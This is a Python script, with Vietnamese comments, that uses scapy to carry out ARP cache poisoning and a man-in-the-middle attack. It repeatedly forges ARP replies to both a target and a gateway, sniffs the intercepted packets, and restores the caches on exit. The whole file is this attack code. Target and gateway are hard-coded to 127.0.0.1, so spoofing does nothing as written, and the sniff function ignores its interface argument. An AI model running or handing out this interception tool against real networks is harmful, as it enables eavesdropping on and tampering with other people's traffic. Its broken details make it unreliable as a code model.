from scapy.all import ARP, Ether, srp, send, sniff
import sys
import time
import threading

def get_mac(ip):
    """Lấy địa chỉ MAC của một IP cụ thể"""
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered = srp(arp_request_broadcast, timeout=2, verbose=False)[0]
    return answered[0][1].hwsrc if answered else None

def spoof(target_ip, spoof_ip):
    """Gửi gói tin ARP giả mạo để đánh lừa target_ip"""
    target_mac = get_mac(target_ip)
    if not target_mac:
        print(f"Không lấy được MAC của {target_ip}")
        sys.exit(1)
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=False)

def restore(destination_ip, source_ip):
    """Khôi phục ARP cache về trạng thái ban đầu"""
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    send(packet, count=4, verbose=False)

def mitm(target_ip, gateway_ip):
    try:
        while True:
            spoof(target_ip, gateway_ip)
            spoof(gateway_ip, target_ip)
            time.sleep(2)
    except KeyboardInterrupt:
        print("\nKhôi phục ARP cache...")
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)
        sys.exit(0)

def sniff_packets(interface="lo"):
    """Bắt gói tin trên localhost (127.0.0.1)"""
    sniff(filter="ip and src host 127.0.0.1", prn=lambda packet: print(packet.summary()), store=False)

if __name__ == "__main__":
    target_ip = "127.0.0.1"  # IP localhost
    gateway_ip = "127.0.0.1"  # IP localhost

    threading.Thread(target=mitm, args=(target_ip, gateway_ip)).start()
    sniff_packets()
